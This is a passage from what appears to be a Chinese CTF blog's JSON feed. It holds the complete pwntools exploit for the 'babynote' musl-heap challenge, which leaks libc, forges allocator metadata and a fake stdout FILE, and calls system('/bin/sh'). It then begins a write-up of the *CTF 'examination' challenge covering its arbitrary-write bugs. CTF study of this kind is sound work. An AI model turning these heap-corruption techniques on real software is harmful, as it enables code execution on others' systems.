class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level =<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;./libc.so&quot;</span>)</span><br><span class=\"line\">r=process([<span class=\"string\">&quot;./libc.so&quot;</span>,<span class=\"string\">&#x27;./babynote&#x27;</span>])</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./babynote&#x27;</span>)</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get8</span>():</span><br><span class=\"line\">\tret = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">\t\tret = r.recv(<span class=\"number\">2</span>)+ret</span><br><span class=\"line\">\tret = <span class=\"string\">b&#x27;0x&#x27;</span>+ret</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"built_in\">int</span>(ret,<span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get4</span>():</span><br><span class=\"line\">\tret = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">4</span>):</span><br><span class=\"line\">\t\tret = r.recv(<span class=\"number\">2</span>)+ret</span><br><span class=\"line\">\tret = <span class=\"string\">b&#x27;0x&#x27;</span>+ret</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"built_in\">int</span>(ret,<span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ch</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;option:&quot;</span>,<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">name,text</span>):</span><br><span class=\"line\">\tch(<span class=\"number\">1</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;name size:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>(name)))</span><br><span class=\"line\">\tr.sendafter(<span class=\"string\">&quot;name&quot;</span>,name)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;size&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>(text)))</span><br><span class=\"line\">\tr.sendafter(<span class=\"string\">&quot;content&quot;</span>,text)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">find</span>(<span class=\"params\">name</span>):</span><br><span class=\"line\">\tch(<span class=\"number\">2</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;name size:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>(name)))</span><br><span class=\"line\">\tr.sendafter(<span class=\"string\">&quot;name&quot;</span>,name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">name</span>):</span><br><span class=\"line\">\tch(<span class=\"number\">3</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;name size:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>(name)))</span><br><span class=\"line\">\tr.sendafter(<span class=\"string\">&quot;name&quot;</span>,name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">clean</span>():\t\t\t<span class=\"comment\">#only set list=0 </span></span><br><span class=\"line\">\tch(<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">gdb.attach(r,<span class=\"string\">&#x27;b malloc&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"string\">b&#x27;a&#x27;</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x28</span>)</span><br><span class=\"line\">add(<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x28</span>)<span class=\"comment\">#slot full size is 0x2c</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;c&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;c&#x27;</span>*<span class=\"number\">0x50</span>)<span class=\"comment\">#slot full size is 0x6c</span></span><br><span class=\"line\">free(<span class=\"string\">b&#x27;a&#x27;</span>)\t\t\t\t<span class=\"comment\">#free the first note,the meta(0xc)is freed,</span></span><br><span class=\"line\">clean()\t\t\t\t\t<span class=\"comment\">#now meta(0x2c) has one no use,and 1 freed,meta(0xc) heav 3 freed</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;a&#x27;</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>)\t\t<span class=\"comment\">#we alloc the last slot in meta(0x2c) for abynote,</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"comment\">#.Reuse the 0 solt in meta(0xc) (malloc from bins),</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"comment\">#then reuse the free slot in meta(0x2c)</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;b&#x27;</span>,<span class=\"string\">b&#x27;b&#x27;</span>)\t\t\t<span class=\"comment\">#malloc a slot(0x2c) in a new meta2(0x2c,and malloc 2 slot(0xc) in meta(0xc)</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"string\">b&#x27;a&#x27;</span>)\t\t\t<span class=\"comment\">#malloc a new slot(0xc),in meta(0xc),then free babynote a,then meta1(0x2c) will have 2 freed slot</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;c&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;c&#x27;</span>*<span class=\"number\">0x28</span>)<span class=\"comment\">#malloc 3slot from  meta2(0x2c),so meta1(0x2c),have 2 freed slot</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;d&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;d&#x27;</span>*<span class=\"number\">0x28</span>)<span class=\"comment\">#</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;e&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;e&#x27;</span>*<span class=\"number\">0x28</span>)<span class=\"comment\">#fill up meta2(0x2c)</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;f&#x27;</span>,<span class=\"string\">b&#x27;f&#x27;</span>*<span class=\"number\">0x50</span>)\t\t<span class=\"comment\">#malloc a baby note from meta1(0x2c),meta1(0x2c) still have one freed, </span></span><br><span class=\"line\"></span><br><span class=\"line\">find(<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;0x28:&quot;</span>)</span><br><span class=\"line\">ss = <span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">\tss = r.recv(<span class=\"number\">2</span>)+ss</span><br><span class=\"line\">ss  = <span class=\"string\">b&#x27;0x&#x27;</span>+ss</span><br><span class=\"line\"><span class=\"built_in\">print</span>(ss)</span><br><span class=\"line\">heap_addr = <span class=\"built_in\">int</span>(ss,<span class=\"number\">16</span>) </span><br><span class=\"line\">libcbase = heap_addr-  <span class=\"number\">0x29fdf0</span></span><br><span class=\"line\">stdout = libcbase + <span class=\"number\">0x2a0e00</span></span><br><span class=\"line\">system = libcbase + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">__malloc_context = <span class=\"number\">0x2a1aa0</span>+libcbase</span><br><span class=\"line\">ofl_head = libcbase+ <span class=\"number\">0x2a3e28</span> </span><br><span class=\"line\">fake_stdout_addr = libcbase+<span class=\"number\">0x29ee20</span>\t\t\t<span class=\"comment\">#we can malloc0x50 to get </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;libcbase : &quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;system : &quot;</span>,<span class=\"built_in\">hex</span>(system))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;stdout : &quot;</span>,<span class=\"built_in\">hex</span>(stdout))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#here we can leak anywhere</span></span><br><span class=\"line\">pad = p64(libcbase+<span class=\"number\">0x29fdb0</span>)+p64(__malloc_context)+p64(<span class=\"number\">1</span>)+p64(<span class=\"number\">0x420</span>)+p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">find(pad)</span><br><span class=\"line\">find(<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#leak __malloc_context to  get meta addr</span></span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&quot;0x420:&quot;</span>)</span><br><span class=\"line\">secret =get8()</span><br><span class=\"line\">r.recv(<span class=\"number\">16</span>)</span><br><span class=\"line\">free_meta = get8()</span><br><span class=\"line\">avail_meta = get8()</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">\tget8()</span><br><span class=\"line\">active=<span class=\"built_in\">list</span>()</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">48</span>):</span><br><span class=\"line\">\tactive.append(get8())</span><br><span class=\"line\">meta_base  = active[<span class=\"number\">0</span>]-<span class=\"number\">0x28</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;Z&#x27;</span>*<span class=\"number\">0x100</span>,<span class=\"string\">b&#x27;Z&#x27;</span>*<span class=\"number\">0x100</span>)\t\t\t\t<span class=\"comment\">#fill up  the old meta to create new meta3(0x2c)</span></span><br><span class=\"line\"></span><br><span class=\"line\">clean()</span><br><span class=\"line\"></span><br><span class=\"line\">fakemeta_addr = <span class=\"number\">0x291020</span>+libcbase</span><br><span class=\"line\">fake_meta =<span class=\"string\">b&#x27;\\x00&#x27;</span>*(<span class=\"number\">4064</span>)+p64(secret)+p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> \t\t\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">fake_meta += p64(ofl_head-<span class=\"number\">0x8</span>)+p64(fake_stdout_addr)\t\t\t\t\t\t\t\t\t\t<span class=\"comment\">#fakemta1</span></span><br><span class=\"line\">fake_meta +=p64(fakemeta_addr+<span class=\"number\">0x40</span>)+p64(<span class=\"number\">0x3fe</span>)+p64(<span class=\"number\">0xa9</span>)+p64(<span class=\"number\">0</span>)\t\t\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">fake_meta +=p64(fakemeta_addr+<span class=\"number\">0x1000</span>)+p64(<span class=\"number\">0x0000c00000000000</span>)</span><br><span class=\"line\">fake_meta +=p64(fakemeta_addr)+p64(<span class=\"number\">0x0000800000000009</span>)</span><br><span class=\"line\">fake_meta +=<span class=\"string\">b&quot;AAAAAAAA&quot;</span></span><br><span class=\"line\">fake_meta = fake_meta.ljust((<span class=\"number\">0x2000</span>-<span class=\"number\">0x20</span>),<span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_meta +=p64(secret)+p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>   \t\t\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"comment\">#fake_area1</span></span><br><span class=\"line\">fake_meta += p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(fakemeta_addr+<span class=\"number\">0x30</span>)+p64(<span class=\"number\">0x0</span>)+p64(<span class=\"number\">0x3c0</span>)+p64(<span class=\"number\">0</span>)\t\t\t<span class=\"comment\">#fakemeta2\t</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#prepare fake chunk and fake sotor</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;g&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;g&#x27;</span>*<span class=\"number\">0x28</span>)</span><br><span class=\"line\">add(<span class=\"string\">b&#x27;h&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;h&#x27;</span>*<span class=\"number\">0x28</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">fakebabynote = p64( <span class=\"number\">0x29fdd0</span> +libcbase)+p64(fakemeta_addr+<span class=\"number\">0x50</span>)+p64(<span class=\"number\">1</span>)+p64(<span class=\"number\">0x28</span>)+p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">add(<span class=\"string\">b&#x27;i&#x27;</span>,fakebabynote)</span><br><span class=\"line\">free(<span class=\"string\">b&#x27;g&#x27;</span>*<span class=\"number\">0x28</span>)</span><br><span class=\"line\">gdb.attach(r)</span><br><span class=\"line\">add(p64(<span class=\"number\">0x29bd00</span>+libcbase)*<span class=\"number\">2</span>+p64(<span class=\"number\">0x8</span>)+p64(<span class=\"number\">0x8</span>)+p64(libcbase+<span class=\"number\">0x29bd90</span>),fake_meta.ljust(<span class=\"number\">0x2000</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">free(<span class=\"string\">b&#x27;b&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">pause()</span><br><span class=\"line\">fake_stdfile  =<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>+p64(<span class=\"number\">0</span>)*<span class=\"number\">6</span>+p64(<span class=\"number\">1</span>)*<span class=\"number\">2</span>+p64(system)*<span class=\"number\">2</span></span><br><span class=\"line\">fake_stdfile = fake_stdfile.ljust(<span class=\"number\">0x50</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"string\">b&#x27;i&#x27;</span>,fake_stdfile)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">ch(<span class=\"number\">5</span>)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"参考链接\"><a class=\"markdownIt-Anchor\" href=\"#参考链接\">#</a> 参考链接</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjQxMTAx\">https://www.anquanke.com/post/id/241101</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2thbGlfTWEvYXJ0aWNsZS9kZXRhaWxzLzEyMjk3MDg4NT9vcHNfcmVxdWVzdF9taXNjPSUyNTdCJTI1MjJyZXF1ZXN0JTI1NUZpZCUyNTIyJTI1M0ElMjUyMjE2NTA0NDQwOTMxNjc4MDI2NTQ3NDgzNiUyNTIyJTI1MkMlMjUyMnNjbSUyNTIyJTI1M0ElMjUyMjIwMTQwNzEzLjEzMDEwMjMzNC5wYyUyNTVGYWxsLiUyNTIyJTI1N0QmYW1wO3JlcXVlc3RfaWQ9MTY1MDQ0NDA5MzE2NzgwMjY1NDc0ODM2JmFtcDtiaXpfaWQ9MCZhbXA7dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3NlYXJjaF9yZXN1bHQubm9uZS10YXNrLWJsb2ctMg==\">https://blog.csdn.net/kali_Ma/article/details/122970885?ops_request_misc=%7B%22request%5Fid%22%3A%22165044409316780265474836%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=165044409316780265474836&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2</span><sub>all</sub>first_rank_ecpm_v1~rank_v31_ecpm-1-122970885.142<sup>v9</sup>control,157<sup>v4</sup>control&amp;utm_term=musl+%E5%A0%86%E5%88%A9%E7%94%A8&amp;spm=1018.2226.3001.4187</p>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/04/18/starctf_examination/",
            "url": "http://example.com/2022/04/18/starctf_examination/",
            "title": "examination",
            "date_published": "2022-04-18T07:17:17.000Z",
            "content_html": "<h1 id=\"from-2022418-ctf-pwn-examination\"><a class=\"markdownIt-Anchor\" href=\"#from-2022418-ctf-pwn-examination\">#</a> from 2022.4.18 *ctf pwn examination</h1>\n<h2 id=\"保护\"><a class=\"markdownIt-Anchor\" href=\"#保护\">#</a> 保护：</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop<span class=\"comment\">/*ctf/examin$ checksec --file=examination</span></span><br><span class=\"line\"><span class=\"comment\">RELRO           STACK CANARY      NX            PIE             </span></span><br><span class=\"line\"><span class=\"comment\">Full RELRO      Canary found      NX enabled    PIE enabled    </span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">RPATH      RUNPATH\tSymbols\t\tFORTIFY\tFortified\tFortifiable\tFILE</span></span><br><span class=\"line\"><span class=\"comment\">No RPATH   RW-RUNPATH   No Symbols\t  No\t0\t\t2\t\texamination</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br></pre></td></tr></table></figure>\n<h2 id=\"过程\"><a class=\"markdownIt-Anchor\" href=\"#过程\">#</a> 过程</h2>\n<p>程序，进行了不同的模式，teacher 或者 student，</p>\n<h3 id=\"重要的结构体\"><a class=\"markdownIt-Anchor\" href=\"#重要的结构体\">#</a> 重要的结构体</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">00000000</span> student         struc ; (<span class=\"keyword\">sizeof</span>=<span class=\"number\">0x20</span>, mappedto_8)\t\t\t\t\t/chunksize=<span class=\"number\">0x31</span></span><br><span class=\"line\"><span class=\"number\">00000000</span> stu             dq ?                    ; offset</span><br><span class=\"line\"><span class=\"number\">00000008</span> nop             dq ?</span><br><span class=\"line\"><span class=\"number\">00000010</span> mode            dq ?                    ; offset\t\t\t\t\t/mode chunkszie =<span class=\"number\">0x31</span></span><br><span class=\"line\"><span class=\"number\">00000018</span> Type            dd ?</span><br><span class=\"line\"><span class=\"number\">0000001</span>C win             dd ?</span><br><span class=\"line\"><span class=\"number\">00000020</span> student         ends</span><br><span class=\"line\"><span class=\"number\">00000020</span></span><br><span class=\"line\"><span class=\"number\">00000000</span> ; ---------------------------------------------------------------------------</span><br><span class=\"line\"><span class=\"number\">00000000</span></span><br><span class=\"line\"><span class=\"number\">00000000</span> info            struc ; (<span class=\"keyword\">sizeof</span>=<span class=\"number\">0x14</span>, mappedto_9)\t\t\t\t\t/chunksize=<span class=\"number\">0x31</span></span><br><span class=\"line\"><span class=\"number\">00000000</span> nums_qestion    dd ?</span><br><span class=\"line\"><span class=\"number\">00000004</span> score           dd ?</span><br><span class=\"line\"><span class=\"number\">00000008</span> comment         dq ?                    ; offset</span><br><span class=\"line\"><span class=\"number\">00000010</span> size            dd ?</span><br><span class=\"line\"><span class=\"number\">00000014</span> info            ends</span><br><span class=\"line\"><span class=\"number\">00000014</span></span><br></pre></td></tr></table></figure>\n<p>按照惯例，我们首先要看的就是对于堆块的输入是否存在着溢出，</p>\n<p>在 teacher 模式下，可以写 commend，但是因为要求你写入 size，并根据 size 大小 calloc，这里目前是不存在溢出的</p>\n<p>另外一个是在 student 模式下 set mode，这里 calloc 0x20 大小的 chunk，然后读入 0X20 数据，也不存在溢出。</p>\n<p>但是我们审计这里发现，判断程序是进行读入 mode 还是预测 pray score，是根据 student 结构体中的 type 判断，而 type 又可以利用 pray 进行操作，type^=1。同时 pray sore 保存的地址与 mode 保存地址一致。所以这里存在任意地址写。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 __fastcall <span class=\"title function_\">set_mode</span><span class=\"params\">(<span class=\"type\">int</span> a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  student *v1; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v3; <span class=\"comment\">// [rsp+14h] [rbp-1Ch] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v4; <span class=\"comment\">// [rsp+18h] [rbp-18h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v4 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( nlist[a1]-&gt;Type != <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !nlist[a1]-&gt;mode )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v1 = nlist[a1];</span><br><span class=\"line\">      v1-&gt;mode = <span class=\"built_in\">calloc</span>(<span class=\"number\">1uLL</span>, <span class=\"number\">0x20</span>uLL);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;enter your mode!&quot;</span>);</span><br><span class=\"line\">    read(<span class=\"number\">0</span>, nlist[a1]-&gt;mode, <span class=\"number\">0x20</span>uLL);</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_9;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;enter your pray score: 0 to 100&quot;</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">&quot;%d&quot;</span>, &amp;v3);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v3 &gt;= <span class=\"number\">0</span> &amp;&amp; v3 &lt;= <span class=\"number\">100</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    LOBYTE(nlist[a1]-&gt;mode) = v3;</span><br><span class=\"line\">LABEL_9:</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;finish&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v4;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;bad!&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v4;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">pray</span><span class=\"params\">(<span class=\"type\">int</span> a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;prayer...Good luck to you&quot;</span>);</span><br><span class=\"line\">  nlist[a1]-&gt;Type ^= <span class=\"number\">1u</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;finish&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当我们继续继续审计代码，发现 student 的 check rewiew 存在任意地址加一。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 __fastcall <span class=\"title function_\">checkfor_rewiew</span><span class=\"params\">(<span class=\"type\">int</span> a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  _BYTE *v1; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">char</span> address[<span class=\"number\">24</span>]; <span class=\"comment\">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v4; <span class=\"comment\">// [rsp+38h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v4 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( nlist[a1]-&gt;win == <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;already gained the reward!&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( nlist[a1]-&gt;stu-&gt;score &gt; <span class=\"number\">0x59</span>u )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Good Job! Here is your reward! %p\\n&quot;</span>, nlist[a1]);</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;add 1 to wherever you want! addr: &quot;</span>);<span class=\"comment\">// 任意地址加1</span></span><br><span class=\"line\">      read_addr(<span class=\"number\">0</span>, address, <span class=\"number\">16</span>);</span><br><span class=\"line\">      v1 = (_BYTE *)atol(address);</span><br><span class=\"line\">      